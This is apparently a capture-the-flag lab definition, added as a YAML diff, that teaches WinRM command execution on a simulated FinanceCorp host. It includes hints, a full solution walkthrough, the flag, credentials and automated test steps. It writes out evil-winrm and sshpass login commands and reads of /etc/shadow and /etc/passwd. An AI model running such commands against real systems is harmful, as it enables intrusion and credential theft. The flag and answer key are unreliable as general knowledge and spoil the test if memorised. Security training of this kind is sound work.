@@ -1,0 +1,477 @@
+name: WinRM Command Execution
+description: Demonstrate the security impact of WinRM access by executing commands on FinanceCorp's systems.
+difficulty: intermediate
+category: exploitation
+duration_minutes: 120
+objectives:
+  - execute commands via winrm session
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your authentication testing against FinanceCorp's WinRM service has been successful. 
+  James Mitchell wants to understand the full security impact of WinRM access by 
+  seeing what an attacker could do with compromised credentials.
+  
+  WinRM provides remote command execution capabilities, which is one of the most 
+  significant security risks. FinanceCorp needs to see concrete evidence of how 
+  WinRM misconfigurations or weak credentials could lead to unauthorized command 
+  execution.
+  
+  Your objective: Successfully authenticate to FinanceCorp's WinRM service and 
+  demonstrate command execution capabilities. Execute commands to show the security 
+  impact of compromised WinRM access.
+
+flag: "OCR{w1nrm_cmd_3x3c}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    title: "Understanding Remote Command Execution"
+    text: |
+      ## Remote Command Execution via WinRM
+
+      **Remote command execution** is the ability to run commands on a
+      target system from a remote location. This is one of the most
+      significant capabilities an attacker gains through WinRM access.
+
+      ### Why Command Execution Matters
+
+      Once an attacker can execute commands remotely, they can:
+
+      - **Gather system information** (hostname, OS, users, network config)
+      - **Read sensitive files** (configuration files, credentials, data)
+      - **Modify system settings** (create accounts, change permissions)
+      - **Install persistence** (backdoors, scheduled tasks, services)
+      - **Move laterally** to other systems on the network
+      - **Exfiltrate data** from the compromised system
+
+      ### WinRM Command Execution in Practice
+
+      In a real Windows environment, WinRM command execution looks like:
+
+      ```powershell
+      # Using evil-winrm
+      evil-winrm -i <target> -u admin -p password123
+      *Evil-WinRM* PS > whoami
+      financecorp\admin
+      *Evil-WinRM* PS > Get-Content C:\flag.txt
+      OCR{...}
+      ```
+
+      ### Command Execution via SSH (Lab Simulation)
+
+      This lab simulates WinRM command execution using SSH. The concepts
+      are identical:
+
+      1. **Authenticate** to the remote service
+      2. **Gain a shell** (PowerShell via WinRM, Bash via SSH)
+      3. **Execute commands** to gather information and find the flag
+      4. **Document findings** for the penetration test report
+
+      ### Common Post-Authentication Commands
+
+      | Command | Purpose |
+      |---------|---------|
+      | `whoami` | Identify current user |
+      | `id` | Check user groups/privileges |
+      | `hostname` | Get system name |
+      | `uname -a` | Get OS/kernel information |
+      | `ls -la` | List files with permissions |
+      | `cat <file>` | Read file contents |
+      | `find / -name "*.txt"` | Search for files |
+
+  - id: 2
+    unlock_after_minutes: 5
+    title: "Tools for Remote Command Execution"
+    text: |
+      ## Command Execution Tools
+
+      ### SSH for Interactive Sessions
+
+      SSH provides a full interactive shell after authentication:
+
+      ```bash
+      # Connect to target
+      ssh admin@<target>
+
+      # Once connected, you have full shell access
+      admin@target:~$ whoami
+      admin@target:~$ ls -la
+      admin@target:~$ cat flag.txt
+      ```
+
+      ### SSH for Single Command Execution
+
+      You can also execute single commands without an interactive shell:
+
+      ```bash
+      # Execute a single command
+      ssh admin@<target> 'whoami'
+
+      # Execute multiple commands
+      ssh admin@<target> 'whoami && hostname && id'
+
+      # Read a specific file
+      ssh admin@<target> 'cat /home/admin/flag.txt'
+      ```
+
+      ### sshpass for Automated Command Execution
+
+      Combine `sshpass` with SSH for fully automated execution:
+
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
+        admin@<target> 'whoami'
+      ```
+
+      ### Evil-WinRM Equivalent Commands
+
+      In a real WinRM scenario, you would use evil-winrm:
+
+      ```powershell
+      # Connect
+      evil-winrm -i <target> -u admin -p password123
+
+      # Execute commands in the PowerShell session
+      *Evil-WinRM* PS > whoami
+      *Evil-WinRM* PS > Get-ChildItem C:\
+      *Evil-WinRM* PS > Get-Content C:\Users\admin\flag.txt
+      ```
+
+      ### Key Reconnaissance Commands
+
+      After gaining access, run these commands to understand the system:
+
+      | Linux (SSH) | Windows (WinRM) | Purpose |
+      |-------------|-----------------|---------|
+      | `whoami` | `whoami` | Current user |
+      | `id` | `whoami /groups` | Group membership |
+      | `uname -a` | `systeminfo` | OS information |
+      | `cat /etc/passwd` | `net user` | List users |
+      | `ifconfig` | `ipconfig` | Network configuration |
+
+  - id: 3
+    unlock_after_minutes: 10
+    title: "Post-Authentication Enumeration"
+    text: |
+      ## What to Do After Gaining Access
+
+      ### Systematic Post-Authentication Enumeration
+
+      After authenticating to a remote system, follow a structured
+      enumeration process to maximize the value of your access:
+
+      #### 1. User Context
+
+      ```bash
+      whoami                    # Who am I?
+      id                        # What groups am I in?
+      sudo -l                   # What can I run as root?
+      ```
+
+      #### 2. System Information
+
+      ```bash
+      hostname                  # System name
+      uname -a                  # Kernel version
+      cat /etc/os-release       # OS distribution
+      ```
+
+      #### 3. Network Information
+
+      ```bash
+      ifconfig                  # Network interfaces
+      netstat -tlnp             # Listening services
+      cat /etc/hosts            # Host mappings
+      ```
+
+      #### 4. File System Exploration
+
+      ```bash
+      ls -la /home/             # Home directories
+      ls -la /root/             # Root home (if accessible)
+      ls -la /tmp/              # Temporary files
+      find / -name "flag*" 2>/dev/null  # Search for flags
+      ```
+
+      #### 5. Sensitive Files
+
+      ```bash
+      cat /etc/shadow           # Password hashes (if readable)
+      cat /etc/passwd           # User accounts
+      ls -la /var/log/          # Log files
+      ```
+
+      ### Demonstrating Impact
+
+      For a penetration test report, you need to demonstrate the
+      **security impact** of the access you gained. Command execution
+      proves that an attacker with these credentials could:
+
+      - Read any file the user has access to
+      - Modify system configurations
+      - Potentially escalate privileges
+      - Use the system as a pivot point
+
+      In this lab, the flag at `/home/admin/flag.txt` represents
+      a sensitive file that demonstrates information disclosure.
+
+  - id: 4
+    unlock_after_minutes: 15
+    title: "Step-by-Step Workflow for This Lab"
+    text: |
+      ## Lab Workflow
+
+      ### Step 1: Verify Target Access
+
+      Confirm the SSH service is running:
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      ### Step 2: Authenticate to the Target
+
+      Connect using SSH with the provided credentials:
+      ```bash
+      ssh admin@<target>
+      ```
+      Password: `password123`
+
+      ### Step 3: Verify Your Access
+
+      Run basic identity commands:
+      ```bash
+      whoami
+      id
+      hostname
+      ```
+
+      ### Step 4: Explore the System
+
+      Enumerate the file system:
+      ```bash
+      pwd
+      ls -la
+      ls -la /home/admin/
+      ```
+
+      ### Step 5: Execute Information Gathering Commands
+
+      Demonstrate command execution capabilities:
+      ```bash
+      uname -a
+      cat /etc/passwd
+      ifconfig
+      ```
+
+      ### Step 6: Retrieve the Flag
+
+      Read the flag file:
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      ### Step 7: Document Findings
+
+      Before exiting, document the commands you executed and their
+      output for your penetration test report.
+
+      ```bash
+      exit
+      ```
+
+      ### Key Points
+
+      - The credentials are `admin` / `password123`
+      - The flag is at `/home/admin/flag.txt`
+      - Demonstrate multiple command execution capabilities
+      - Show that you can read sensitive files
+      - This proves the security impact of compromised WinRM access
+
+  - id: 5
+    unlock_after_minutes: 20
+    title: "Exact Commands for This Lab"
+    text: |
+      ## Commands to Complete This Lab
+
+      ### 1. Verify Service
+
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      ### 2. Connect via SSH
+
+      ```bash
+      ssh admin@<target>
+      ```
+      Accept host key: `yes`
+      Password: `password123`
+
+      ### 3. Execute Reconnaissance Commands
+
+      ```bash
+      whoami
+      id
+      hostname
+      uname -a
+      ```
+
+      ### 4. List Files
+
+      ```bash
+      ls -la /home/admin/
+      ```
+
+      ### 5. Read the Flag
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      ### 6. Exit
+
+      ```bash
+      exit
+      ```
+
+      ### Alternative: Execute Commands Without Interactive Shell
+
+      Run commands directly via SSH:
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
+        admin@<target> 'whoami && id && hostname'
+      ```
+
+      Retrieve the flag directly:
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
+        admin@<target> 'cat /home/admin/flag.txt'
+      ```
+
+      ### Alternative: Multiple Commands in Sequence
+
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no \
+        admin@<target> 'whoami; id; uname -a; cat /home/admin/flag.txt'
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    title: "Complete Solution Walkthrough"
+    text: |
+      ## Full Solution Walkthrough
+
+      ### Step 1: Service Scan
+
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      **Expected Output:**
+      ```
+      PORT   STATE SERVICE VERSION
+      22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+      ```
+
+      ### Step 2: SSH Authentication
+
+      ```bash
+      ssh admin@<target>
+      ```
+
+      **Expected Interaction:**
+      ```
+      admin@<target>'s password: password123
+      Welcome to Ubuntu 22.04 LTS
+      admin@target:~$
+      ```
+
+      ### Step 3: Command Execution Demonstration
+
+      ```bash
+      whoami
+      ```
+      ```
+      admin
+      ```
+
+      ```bash
+      id
+      ```
+      ```
+      uid=1000(admin) gid=1000(admin) groups=1000(admin)
+      ```
+
+      ```bash
+      hostname
+      ```
+      ```
+      target
+      ```
+
+      ```bash
+      uname -a
+      ```
+      ```
+      Linux target 5.15.0 #1 SMP x86_64 GNU/Linux
+      ```
+
+      ### Step 4: File System Exploration
+
+      ```bash
+      ls -la /home/admin/
+      ```
+      ```
+      total 12
+      drwxr-xr-x 2 admin admin 4096 Jan  1 00:00 .
+      drwxr-xr-x 3 root  root  4096 Jan  1 00:00 ..
+      -rw-r--r-- 1 admin admin   25 Jan  1 00:00 flag.txt
+      ```
+
+      ### Step 5: Flag Retrieval
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+      ```
+      OCR{...}
+      ```
+
+      ### Summary
+
+      | Command | Output | Purpose |
+      |---------|--------|---------|
+      | `whoami` | admin | Confirmed user identity |
+      | `id` | uid=1000(admin) | Confirmed group membership |
+      | `hostname` | target | Identified system name |
+      | `uname -a` | Linux 5.15.0 | Identified OS/kernel |
+      | `ls -la` | flag.txt visible | Found target file |
+      | `cat flag.txt` | OCR{...} | Retrieved the flag |
+
+      This lab demonstrates that WinRM (or SSH) access with valid
+      credentials provides full command execution capability on the
+      target system, representing a critical security risk.
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "winrm-user"
+    description: "WinRM/SSH admin credentials"
+
+workbook: "wiki/range/winpt/CH05_WinRM_Exploitation/05_WinRM_Command_Execution/"
+
+test:
+  steps:
+    - name: "Verify SSH port 22 is open"
+      command: "nmap -Pn -p 22 {target.target} | grep '22/tcp'"
+      expect: "open"
+
+    - name: "Execute remote command via SSH"
+      command: "sshpass -p '{cred.winrm-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.winrm-user.user}@{target.target} 'whoami && hostname'"
+      expect: "admin"
+
+    - name: "Retrieve flag via SSH"
+      command: "sshpass -p '{cred.winrm-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.winrm-user.user}@{target.target} 'cat /home/admin/flag.txt'"
+      expect: "OCR{"
